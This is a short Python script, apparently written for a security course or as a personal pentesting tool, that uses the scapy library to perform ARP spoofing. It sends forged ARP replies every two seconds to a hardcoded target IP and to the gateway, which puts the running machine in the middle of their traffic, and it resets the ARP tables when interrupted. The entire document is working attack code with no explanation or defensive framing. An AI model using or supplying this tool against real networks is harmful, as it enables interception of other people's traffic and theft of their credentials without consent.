#!/usr/bin/python3

import scapy.all as scapy
import time

def get_mac(ip_add):
    packet = scapy.ARP(op=1, pdst=ip_add, hwdst="ff:ff:ff:ff:ff:ff")
    ans_list = scapy.sr(packet)[0]
    return ans_list[0][1].hwsrc

def send_response(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)

def restore_arp_table(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, verbose=False, count=4)

target_ip = "192.168.1.14"
gateway_ip = "192.168.1.1"

restore_arp_table(target_ip, gateway_ip)

try:
    count = 0
    while True:
        send_response(target_ip, gateway_ip)
        send_response(gateway_ip, target_ip)
        count += 2
        print("\rPacket sent : " + str(count), end="")
        time.sleep(2)
except KeyboardInterrupt:
    restore_arp_table(target_ip, gateway_ip)
    restore_arp_table(gateway_ip, target_ip)
    print("\nExiting program....")